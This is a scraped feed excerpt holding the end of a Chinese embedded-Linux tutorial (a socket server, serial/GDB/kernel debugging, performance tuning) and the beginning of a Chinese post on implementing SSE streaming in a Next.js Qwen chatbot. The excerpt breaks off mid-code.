    <span class="hljs-type">int</span> server_fd, client_fd;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server_addr</span>, <span class="hljs-title">client_addr</span>;</span>
    <span class="hljs-type">socklen_t</span> addr_len = <span class="hljs-keyword">sizeof</span>(client_addr);
    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];
    
    <span class="hljs-comment">// 创建socket</span>
    server_fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (server_fd &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"socket failed"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
    
    <span class="hljs-comment">// 设置地址</span>
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);
    
    <span class="hljs-comment">// 绑定端口</span>
    <span class="hljs-keyword">if</span> (bind(server_fd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;server_addr, <span class="hljs-keyword">sizeof</span>(server_addr)) &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"bind failed"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
    
    <span class="hljs-comment">// 监听连接</span>
    <span class="hljs-keyword">if</span> (listen(server_fd, <span class="hljs-number">3</span>) &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"listen failed"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
    
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Server listening on port %d\n"</span>, PORT);
    
    <span class="hljs-comment">// 接受连接</span>
    client_fd = accept(server_fd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;client_addr, &amp;addr_len);
    <span class="hljs-keyword">if</span> (client_fd &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"accept failed"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
    
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Client connected\n"</span>);
    
    <span class="hljs-comment">// 接收数据</span>
    <span class="hljs-type">int</span> bytes_read = read(client_fd, buffer, <span class="hljs-keyword">sizeof</span>(buffer));
    <span class="hljs-keyword">if</span> (bytes_read &gt; <span class="hljs-number">0</span>) {
        buffer[bytes_read] = <span class="hljs-string">'\0'</span>;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Received: %s\n"</span>, buffer);
        
        <span class="hljs-comment">// 发送响应</span>
        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *response = <span class="hljs-string">"Message received"</span>;
        write(client_fd, response, <span class="hljs-built_in">strlen</span>(response));
    }
    
    close(client_fd);
    close(server_fd);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>这个服务器程序监听8888端口，接受客户端连接，接收数据并发送响应。</p>
<p>在实际项目中，我们通常会使用多线程或者异步IO来处理多个客户端连接。</p>
<h2 data-id="heading-13">4. 调试技巧</h2>
<h3 data-id="heading-14">4.1 串口调试</h3>
<p>串口是嵌入式开发中最常用的调试工具。</p>
<p>通过串口，我们可以看到系统的启动信息、内核日志、应用程序输出等等。</p>
<p>在Linux中，串口设备通常是<code>/dev/ttyS0</code>、<code>/dev/ttyUSB0</code>这样的设备文件。</p>
<p>使用串口的时候，需要设置波特率、数据位、停止位等参数。</p>
<p>可以使用<code>minicom</code>或者<code>picocom</code>这样的工具:</p>
<pre><code class="hljs language-bash" lang="bash">picocom -b 115200 /dev/ttyUSB0
</code></pre>
<p>这条命令以115200的波特率打开<code>/dev/ttyUSB0</code>设备。</p>
<h3 data-id="heading-15">4.2 GDB调试</h3>
<p>对于应用程序的调试，我们可以使用GDB。</p>
<p>在嵌入式系统上，通常使用gdbserver进行远程调试。</p>
<p>首先在目标板上运行gdbserver:</p>
<pre><code class="hljs language-bash" lang="bash">gdbserver :1234 ./myapp
</code></pre>
<p>然后在PC上使用交叉编译版本的GDB连接:</p>
<pre><code class="hljs language-bash" lang="bash">arm-linux-gnueabihf-gdb myapp
(gdb) target remote 192.168.1.100:1234
(gdb) <span class="hljs-built_in">break</span> main
(gdb) <span class="hljs-built_in">continue</span>
</code></pre>
<p>这样就可以在PC上调试运行在目标板上的程序了。</p>
<p>可以设置断点、单步执行、查看变量等等。</p>
<h3 data-id="heading-16">4.3 内核调试</h3>
<p>内核调试比应用程序调试要复杂一些。</p>
<p>最常用的方法是使用<code>printk</code>打印日志。</p>
<p><code>printk</code>的用法和<code>printf</code>类似，但是输出会记录到内核日志中，可以通过<code>dmesg</code>命令查看。</p>
<pre><code class="hljs language-c" lang="c">printk(KERN_INFO <span class="hljs-string">"This is an info message\n"</span>);
printk(KERN_WARNING <span class="hljs-string">"This is a warning message\n"</span>);
printk(KERN_ERR <span class="hljs-string">"This is an error message\n"</span>);
</code></pre>
<p>日志级别有KERN_EMERG、KERN_ALERT、KERN_CRIT、KERN_ERR、KERN_WARNING、KERN_NOTICE、KERN_INFO、KERN_DEBUG等等，级别越高越重要。</p>
<p>对于更复杂的内核调试，可以使用KGDB或者JTAG调试器。</p>
<p>KGDB允许你使用GDB调试内核，JTAG调试器则可以在硬件级别进行调试。</p>
<h2 data-id="heading-17">5. 性能优化</h2>
<h3 data-id="heading-18">5.1 启动时间优化</h3>
<p>嵌入式设备通常对启动时间有要求，特别是消费电子产品。</p>
<p>优化启动时间的方法有很多，比如并行化启动脚本、延迟加载不必要的服务、使用静态链接减少动态库加载时间等等。</p>
<p>我在做汽车电子项目的时候，客户要求系统在3秒内启动完成。</p>
<p>为了达到这个目标，我们做了很多优化。</p>
<p>首先是精简内核，把不需要的驱动和功能都去掉。</p>
<p>然后优化启动脚本，把一些不紧急的服务放到后台启动。</p>
<p>最后使用了压缩的文件系统，减少了文件读取时间。</p>
<h3 data-id="heading-19">5.2 内存优化</h3>
<p>嵌入式设备的内存通常比较有限，所以内存优化非常重要。</p>
<p>可以使用<code>free</code>命令查看内存使用情况，使用<code>top</code>命令查看各个进程的内存占用。</p>
<p>如果发现内存不够用，可以考虑以下几个方面:</p>
<ol>
<li>减少不必要的进程和服务</li>
<li>使用内存池来管理频繁分配释放的小块内存</li>
<li>使用mmap映射文件而不是一次性读入内存</li>
<li>及时释放不再使用的内存</li>
</ol>
<h3 data-id="heading-20">5.3 CPU优化</h3>
<p>CPU性能优化主要是减少不必要的计算和优化算法。</p>
<p>可以使用<code>top</code>命令查看CPU占用率，使用<code>perf</code>工具进行性能分析。</p>
<p>对于实时性要求高的任务，可以考虑使用实时调度策略。</p>
<p>Linux支持SCHED_FIFO和SCHED_RR两种实时调度策略，可以保证任务得到及时响应。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span>

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sched_param</span> <span class="hljs-title">param</span>;</span>
param.sched_priority = <span class="hljs-number">50</span>;
sched_setscheduler(<span class="hljs-number">0</span>, SCHED_FIFO, &amp;param);
</code></pre>
<p>这段代码把当前进程设置为FIFO实时调度，优先级是50。</p>
<h2 data-id="heading-21">6. 总结</h2>
<p>嵌入式Linux开发涉及的内容非常广泛，从底层的Bootloader、内核、驱动，到上层的应用程序开发，每一个环节都需要扎实的基础知识。</p>
<p>我从单片机转到Linux开发的时候，也是从零开始学习，花了很长时间才慢慢掌握。</p>
<p>但是一旦掌握了这些技能，你会发现嵌入式Linux开发非常有意思。</p>
<p>你可以控制硬件，可以开发复杂的应用，可以解决各种各样的技术难题。</p>
<p>而且Linux的开源特性让你可以深入了解系统的每一个细节，这对于技术的提升非常有帮助。</p>
<p>如果你也想从事嵌入式Linux开发，我的建议是先打好基础，学习C语言、数据结构、操作系统原理等等。</p>
<p>然后动手实践，从简单的驱动开始写起，逐步深入。</p>
<p>遇到问题不要怕，多查资料，多思考，多尝试。</p>
<p>相信只要坚持下去，你一定能成为一名优秀的嵌入式Linux开发工程师。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[流式输出(Streaming)实现：提升用户体验]]></title>    <link>https://juejin.cn/post/7602162809292242982</link>    <guid>https://juejin.cn/post/7602162809292242982</guid>    <pubDate>2026-02-03T02:45:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602162809292242982" data-draft-id="7602154088476426278" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="流式输出(Streaming)实现：提升用户体验"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T02:45:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="听风者就是我"/> <meta itemprop="url" content="https://juejin.cn/user/360295544143277"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            流式输出(Streaming)实现：提升用户体验
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/360295544143277/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    听风者就是我
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T02:45:05.000Z" title="Tue Feb 03 2026 02:45:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代 Web 应用中，用户体验的关键在于响应速度和交互反馈。当处理耗时操作时，传统的"等待-返回"模式往往让用户感到焦虑。流式输出（Streaming）技术通过逐步返回数据，让用户实时看到处理进度，极大提升了体验感知。本文将深入探讨如何在 Qwen Chatbot 项目中使用 SSE（Server-Sent Events）和异步处理实现流式输出。</p>
<h2 data-id="heading-0">为什么需要流式输出？</h2>
<p>想象一个场景：用户向 AI 助手提问，传统方式需要等待完整答案生成后才能看到结果，可能需要等待数十秒。而流式输出允许答案逐字逐句地呈现，就像真人对话一样自然。这种即时反馈不仅减少了感知等待时间，还增强了应用的互动性。</p>
<p>流式输出的典型应用场景包括：</p>
<ul>
<li>AI 对话系统（ChatGPT 式交互）</li>
<li>大文件处理进度</li>
<li>实时日志输出</li>
<li>数据分析报告生成</li>
</ul>
<h2 data-id="heading-1">技术选型：为什么选择 SSE？</h2>
<p>在实现流式数据传输时，我们有几种选择：WebSocket、HTTP/2 Server Push 和 SSE。对于单向数据流（服务器到客户端），SSE 是最优方案：</p>
<ul>
<li><strong>简单易用</strong>：基于 HTTP 协议，无需复杂握手</li>
<li><strong>自动重连</strong>：浏览器原生支持断线重连</li>
<li><strong>轻量级</strong>：相比 WebSocket 更节省资源</li>
<li><strong>防火墙友好</strong>：使用标准 HTTP 端口</li>
</ul>
<h2 data-id="heading-2">Qwen Chatbot 项目中的实现方案</h2>
<h3 data-id="heading-3">服务端：API 路由实现</h3>
<p>Next.js 的 Pages Router 提供了强大的 API 路由功能，非常适合实现 SSE。以下是 Qwen Chatbot 项目中的完整实现示例：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// pages/api/qwen.ts</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">NextApiRequest</span>, <span class="hljs-title class_">NextApiResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'next'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">OpenAI</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'openai'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">req: NextApiRequest, res: NextApiResponse</span>) {
  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> !== <span class="hljs-string">'POST'</span>) {
    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">405</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Method not allowed'</span> });
  }

  <span class="hljs-keyword">const</span> { messages, stream = <span class="hljs-literal">false</span>, model, temperature = <span class="hljs-number">0.7</span>, top_p = <span class="hljs-number">0.9</span>, max_tokens = <span class="hljs-number">2048</span> } = req.<span class="hljs-property">body</span>;

  <span class="hljs-comment">// 验证必需字段</span>
  <span class="hljs-keyword">if</span> (!messages || !<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(messages)) {
    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Messages are required and must be an array'</span> });
  }

  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 创建 OpenAI 兼容的客户端，适配通义千问</span>
    <span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({
      <span class="hljs-attr">apiKey</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">OPENAI_API_KEY</span> || <span class="hljs-string">''</span>,
      <span class="hljs-attr">baseURL</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">OPENAI_API_BASE</span> || <span class="hljs-string">'https://dashscope.aliyuncs.com/compatible-mode/v1'</span>,
    });

    <span class="hljs-keyword">if</span> (stream) {
      <span class="hljs-comment">// 使用 TransformStream 实现流式响应</span>
      <span class="hljs-keyword">const</span> encoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoder</span>();
      <span class="hljs-keyword">const</span> stream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformStream</span>();
      <span class="hljs-keyword">const</span> writer = stream.<span class="hljs-property">writable</span>.<span class="hljs-title function_">getWriter</span>();

      <span class="hljs-comment">// 异步处理函数</span>
      (<span class="hljs-keyword">async</span> () =&gt; {
        <span class="hljs-keyword">try</span> {
          <span class="hljs-comment">// 通义千问API支持system message，直接使用原始消息</span>
          <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> client.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
            <span class="hljs-attr">model</span>: model || process.<span class="hljs-property">env</span>.<span class="hljs-property">MODEL_NAME</span> || <span class="hljs-string">'qwen-max'</span>,
            messages,
            <span class="hljs-attr">stream</span>: <span class="hljs-literal">true</span>,
            temperature,
            top_p,
            max_tokens,
            <span class="hljs-attr">stream_options</span>: { <span class="hljs-attr">include_usage</span>: <span class="hljs-literal">true</span> }, <span class="hljs-comment">// 包含使用量信息</span>
          });

          <span class="hljs-comment">// 逐块发送数据</span>
          <span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> (<span class="hljs-keyword">const</span> chunk <span class="hljs-keyword">of</span> response) {
            <span class="hljs-keyword">const</span> content = chunk.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>]?.<span class="hljs-property">delta</span>?.<span class="hljs-property">content</span>;
            
            <span class="hljs-comment">// 如果有内容，发送内容数据</span>
            <span class="hljs-keyword">if</span> (content) {
              <span class="hljs-keyword">const</span> data = <span class="hljs-string">`data: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify({ content })}</span>\n\n`</span>;
              <span class="hljs-keyword">await</span> writer.<span class="hljs-title function_">write</span>(encoder.<span class="hljs-title function_">encode</span>(data));
            }
            
            <span class="hljs-comment">// 如果有usage信息，发送token使用数据</span>
            <span class="hljs-keyword">if</span> (chunk.<span class="hljs-property">usage</span>) {
              <span class="hljs-keyword">const</span> tokenData = {
                <span class="hljs-attr">usage</span>: {
                  <span class="hljs-attr">prompt_tokens</span>: chunk.<span class="hljs-property">usage</span>.<span class="hljs-property">prompt_tokens</span>,
                  <span class="hljs-attr">completion_tokens</span>: chunk.<span class="hljs-property">usage</span>.<span class="hljs-property">completion_tokens</span>,
                  <span class="hljs-attr">total_tokens</span>: chunk.<span class="hljs-property">usage</span>.<span class="hljs-property">total_tokens</span>,
                }
              };
              <span class="hljs-keyword">const</span> data = <span class="hljs-string">`data: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(tokenData)}</span>\n\n`</span>;
              <span class="hljs-keyword">await</span> writer.<span class="hljs-title function_">write</span>(encoder.<span class="hljs-title function_">encode</span>(data));
            }
          }
          
          <span class="hljs-comment">// 发送结束信号</span>
          <span class="hljs-keyword">await</span> writer.<span class="hljs-title function_">write</span>(encoder.<span class="hljs-title function_">encode</span>(<span class="hljs-string">'data: [DONE]\n\n'</span>));
        } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">any</span>) {
          <span class="hljs-comment">// 发送错误信息</span>
          <span class="hljs-keyword">await</span> writer.<span class="hljs-title function_">write</span>(
            encoder.<span class="hljs-title function_">encode</span>(<span class="hljs-string">`data: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify({ error: error.message || <span class="hljs-string">'AI service error'</span> })}</span>\n\n`</span>)
          );
        } <span class="hljs-keyword">finally</span> {
          <span class="hljs-keyword">await</span> writer.<span class="hljs-title function_">close</span>();
        }
      })();

      <span class="hljs-comment">// 返回 SSE 响应</span>
      res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'text/event-stream'</span>);
      res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Cache-Control'</span>, <span class="hljs-string">'no-cache'</span>);
      res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Connection'</span>, <span class="hljs-string">'keep-alive'</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(stream.<span class="hljs-property">readable</span>, {
        <span class="hljs-attr">headers</span>: {
          <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/event-stream'</span>,
          <span class="hljs-string">'Cache-Control'</span>: <span class="hljs-string">'no-cache'</span>,
          <span class="hljs-string">'Connection'</span>: <span class="hljs-string">'keep-alive'</span>,
        },
      });
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 非流式响应</span>
      <span class="hljs-comment">// 通义千问API支持system message，直接使用原始消息</span>
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> client.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
        <span class="hljs-attr">model</span>: model || process.<span class="hljs-property">env</span>.<span class="hljs-property">MODEL_NAME</span> || <span class="hljs-string">'qwen-max'</span>,
        messages,
        temperature,
        top_p,
        max_tokens,
      });

      <span class="hljs-keyword">const</span> content = response.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>]?.<span class="hljs-property">message</span>?.<span class="hljs-property">content</span> || <span class="hljs-string">''</span>;
      <span class="hljs-keyword">const</span> usage = response.<span class="hljs-property">usage</span>;
      
      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>({ 
        content, 
        <span class="hljs-attr">usage</span>: usage ? {
          <span class="hljs-attr">prompt_tokens</span>: usage.<span class="hljs-property">prompt_tokens</span>,
          <span class="hljs-attr">completion_tokens</span>: usage.<span class="hljs-property">completion_tokens</span>,
          <span class="hljs-attr">total_tokens</span>: usage.<span class="hljs-property">total_tokens</span>,
        } : <span class="hljs-literal">undefined</span>
      });
    }
  } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">any</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Error calling Qwen API:'</span>, error);
    
    <span class="hljs-keyword">let</span> errorMessage = <span class="hljs-string">'An error occurred while calling the API'</span>;
    <span class="hljs-keyword">let</span> statusCode = <span class="hljs-number">500</span>;
    
    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">status</span> === <span class="hljs-number">401</span>) {
      errorMessage = <span class="hljs-string">'Authentication failed. Please check your API key.'</span>;
      statusCode = <span class="hljs-number">401</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (error.<span class="hljs-property">status</span> === <span class="hljs-number">403</span>) {
      errorMessage = <span class="hljs-string">'Access forbidden. Please check your API permissions.'</span>;
      statusCode = <span class="hljs-number">403</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (error.<span class="hljs-property">status</span> === <span class="hljs-number">429</span>) {
      errorMessage = <span class="hljs-string">'Rate limit exceeded. Please try again later.'</span>;
      statusCode = <span class="hljs-number">429</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (error.<span class="hljs-property">status</span> === <span class="hljs-number">404</span> &amp;&amp; error.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'model'</span>)) {
      errorMessage = <span class="hljs-string">'Model not found or access denied. Please check the model name and your API permissions. Try using "qwen-max" instead of "qwen-max-0102".'</span>;
      statusCode = <span class="hljs-number">404</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (error.<span class="hljs-property">message</span>) {
      errorMessage = error.<span class="hljs-property">message</span>;
    }
    
    res.<span class="hljs-title function_">status</span>(statusCode).<span class="hljs-title function_">json</span>({ 
      <span class="hljs-attr">error</span>: errorMessage,
      <span class="hljs-attr">details</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'development'</span> ? error.<span class="hljs-title function_">toString</span>() : <span class="hljs-literal">undefined</span>
    });
  }
}
</code></pre>
<p>关键点解析：</p>
<ol>
<li><strong>TransformStream</strong>：Next.js 推荐的流处理方式，比传统的 ReadableStream 更灵活</li>
<li><strong>TextEncoder</strong>：将字符串转换为 Uint8Array，符合流传输要求</li>
<li><strong>SSE 格式</strong>：数据必须以 <code>data: </code> 开头，以 <code>\n\n</code> 结尾</li>
<li><strong>异步 IIFE</strong>：立即执行的异步函数，避免阻塞响应返回</li>
<li><strong>通义千问适配</strong>：使用 OpenAI 兼容的 API 客户端，适配通义千问 API</li>
</ol>
<h3 data-id="heading-4">客户端：React 组件实现</h3>
<p>客户端需要处理 SSE 连接并实时更新 UI，以下是 Qwen Chatbot 项目中的实现：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// pages/chat.tsx (SSE 处理部分)</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">e: React.FormEvent</span>) =&gt; {
  e.<span class="hljs-title function_">preventDefault</span>();
  <span class="hljs-keyword">if</span> (!inputMessage.<span class="hljs-title function_">trim</span>() || isLoading) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 添加用户消息</span>
  <span class="hljs-keyword">const</span> userMessage = { <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: inputMessage };
  <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'ADD_MESSAGE'</span>, <span class="hljs-attr">payload</span>: userMessage });
  <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'SET_INPUT_MESSAGE'</span>, <span class="hljs-attr">payload</span>: <span class="hljs-string">''</span> });
  <span class="hljs-title function_">setIsLoading</span>(<span class="hljs-literal">true</span>);

  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 准备消息数组，如果选择了角色并且该角色有系统提示，则在开头添加系统消息</span>
    <span class="hljs-keyword">let</span> messagesToSend = [...messages, userMessage];
    
    <span class="hljs-keyword">if</span> (selectedRoleId) {
